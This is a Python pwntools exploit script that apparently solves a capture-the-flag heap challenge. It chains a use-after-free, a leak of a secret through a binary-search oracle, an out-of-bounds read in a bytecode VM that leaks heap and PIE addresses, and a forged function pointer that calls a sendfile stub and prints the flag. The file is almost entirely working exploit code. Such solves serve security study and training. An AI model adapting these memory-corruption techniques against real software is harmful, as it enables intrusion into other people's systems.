#!/usr/bin/env python3

import os

from pwn import *

exe = ELF("./transit_patched")
libc = ELF("./libc-chall.so")   # version 2.43
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    global r, flag

    if args.LOCAL:
        flag = open("./flag.txt", "r")

        # Set flag fd to something that is not a special character
        os.dup2(flag.fileno(), 11)
        os.set_inheritable(11, True)

        # Propagate the fd to the challenge process
        r = process([exe.path], close_fds=False)

        # Process has its own flag fd; we can close it
        flag.close()

        if args.GDB:
            gdb.attach(r, "breakrva 0x1dde")
    else:
        r = remote("house-xiii-e1277b7b3bbc.chals.z0d1ak.org", 1337, ssl=True)

    return r


def create_station(idx: int):
    r.sendlineafter(b"control> ", b"1")
    r.sendlineafter(b"id: ", str(idx).encode())


def modify_station_vm(idx: int, offset: int, data: bytes):
    r.sendlineafter(b"control> ", b"2")
    r.sendlineafter(b"id: ", str(idx).encode())
    r.sendlineafter(b"pos: ", str(offset).encode())
    r.sendlineafter(b"blob: ", data.hex().encode())


def set_station_vm(idx: int, data: bytes):
    r.sendlineafter(b"control> ", b"3")
    r.sendlineafter(b"id: ", str(idx).encode())
    r.sendlineafter(b"blob: ", data.hex().encode())


def show_result(idx: int):
    r.sendlineafter(b"control> ", b"4")
    r.sendlineafter(b"id: ", str(idx).encode())

    # The output format is: "result:<hex bytes>"
    r.recvuntil(b"result:")
    return r.recvline().strip()


def create_orbital(station_idx: int, orbital_idx: int):
    r.sendlineafter(b"control> ", b"5")
    r.sendlineafter(b"id-a: ", str(station_idx).encode())
    r.sendlineafter(b"id-b: ", str(orbital_idx).encode())


def get_orbital_status(idx: int, value: int) -> int:
    r.sendlineafter(b"control> ", b"6")
    r.sendlineafter(b"id: ", str(idx).encode())
    r.sendlineafter(b"value: ", str(value).encode())
    r.recvuntil(b"status:")
    return int(r.recvline().strip(), 16)


def call_orbital(idx: int):
    r.sendlineafter(b"control> ", b"7")
    r.sendlineafter(b"id: ", str(idx).encode())


def free_station(idx: int):
    r.sendlineafter(b"control> ", b"8")
    r.sendlineafter(b"id: ", str(idx).encode())


def free_orbital(idx: int):
    r.sendlineafter(b"control> ", b"9")
    r.sendlineafter(b"id: ", str(idx).encode())


def integrity_check(a1: int, a2: int, a3: int, secret: int) -> int:
    C1   = 0xbf58476d1ce4e5b9
    C2   = 0x94d049bb133111eb
    GR   = 0x9e3779b185ebca87
    MASK = (1 << 64) - 1

    mask64 = lambda x: x & MASK
    mix1 = lambda x: mask64(C1 * (x ^ (x >> 30)))
    mix2 = lambda x: mask64(C2 * (x ^ (x >> 27)))

    v4 = ror(secret, 11, 64)
    v5 = rol(secret, 29, 64)
    v6 = mask64(a3 + rol(secret, 7, 64) - 0x5a815e3b62dfc941)
    v7 = mix1(mask64(a2 + v4 + 0x13f0a5b7c9e2468d))
    v8 = mix2(mix1(mask64(a1 + v5 - 0x2e59ec3f213f0012)))
    v9 = ror(mix2(mix1(v6)) ^ (mix2(mix1(v6)) >> 31), 9, 64)
    v10 = rol(mix2(v7) ^ (mix2(v7) >> 31), 23, 64)

    x = mask64(v10 ^ v9 ^ (v8 >> 31) ^ v8 ^ mask64(GR * a1))
    return mask64(mix2(mix1(x)) ^ (mix2(mix1(x)) >> 31))


def main():
    r = conn()

    exe.sym["sendfile_stub"] = 0x2160

    # It creates an orbital from station, but once it frees the latter
    # the program doesn't set to NULL its pointer, making it dangling.
    # This makes it so orbital[0] == station[0]:
    #
    create_station(0)
    create_orbital(0, 0)

    # Use `get_orbital_status` to leak the random secret using binary search.
    # That secret is used to XOR different important values like a function
    # pointer to call
    #
    # We propose a bitwise approach to perform binary search (same thing but cooler)
    #
    secret = 0b1111111111111111111111111111111111111111111111111111111111111111
    mask   = 0b1000000000000000000000000000000000000000000000000000000000000000
    for _ in range(64):
        status = get_orbital_status(0, secret ^ mask)
        if status == 0x73:  # n > secret; keep bit to 1
            secret ^= mask
        mask >>= 1

    log.info(f"secret: {secret:#x}")

    # Create a new station to leak heap and pie
    create_station(1)

    # We'll write a VM code that goes OOB and reads the two pointers.
    # This is possible because the instruction that changes the offset
    # does something similar to this:
    #
    #       case 0x19: {
    #           int8_t delta = program[pc + 1];
    #           pc += 2;
    #       
    #           // This calculation is performed as INT!
    #           int new_off = off + delta;
    #       
    #           // Then it's casted, but it's too late
    #           if ((unsigned)(new_off + 0x60) <= 0xdf)
    #               off = new_off;
    #           break;
    #       }
    # 
    s8 = lambda x : p8(x & 0xff)    # Helper to pack values as signed bytes

    vm_code = flat(
        p8(0x19), s8(-0x50),    # OOB
        p8(0x2d),               # Print data[offset]
        p8(0x19), p8(0x1),      # Increments offset to read next byte
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(3),        # Skip the two last bytes (we know they're zero)
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d),
        p8(0x19), p8(0x1),
        p8(0x2d)
    )

    set_station_vm(1, vm_code)
    leaks = bytes.fromhex(show_result(1).decode())

    heap = int.from_bytes(leaks[:6], "little") - 0x124b0
    exe.address = int.from_bytes(leaks[6:], "little") - 0x2060
    log.info(f"heap: {heap:#x}")
    log.info(f"pie:  {exe.address:#x}")

    # Change func_ptr to read_string and overwrite the overlapping orbital/station.
    # fgets will read and enormous amount of bytes because $rsi is an address
    # (huge raw value).
    # After this overlapping chunk there's the tcache metadata chunk
    # (new thing from glibc 2.42+), we might be interested in overwriting stuff inside it
    # 
    # NOTE: The intended solve is to guess the already-opened flag file and call sendfile...
    #       SO the above idea to overwrite tcache metadata is not necessary for our goal :)
    # 
    for fd in range(3, 64):
        if fd == 0xa: continue  # Bad special character; we have to skip it

        orbital_chunk = heap + 0x12020
        obf_func_ptr = rol((orbital_chunk + 0x70) ^ secret, 17)
        check_val = integrity_check(obf_func_ptr, 3, orbital_chunk, secret)

        payload = flat(
            obf_func_ptr,
            check_val,
            exe.sym["sendfile_stub"],
            p32(fd),
            p32(0xd),   # It requires '\r' as next dword
            0x3
        )

        modify_station_vm(0, 0, payload)

        # Now we can call the sendfile stub function and print the flag (eventually)
        call_orbital(0)
        flag = r.recvline().strip()

        if flag != b"operation failure":
            log.success(f"Flag: {flag.decode()}")
            break


if __name__ == "__main__":
    main()
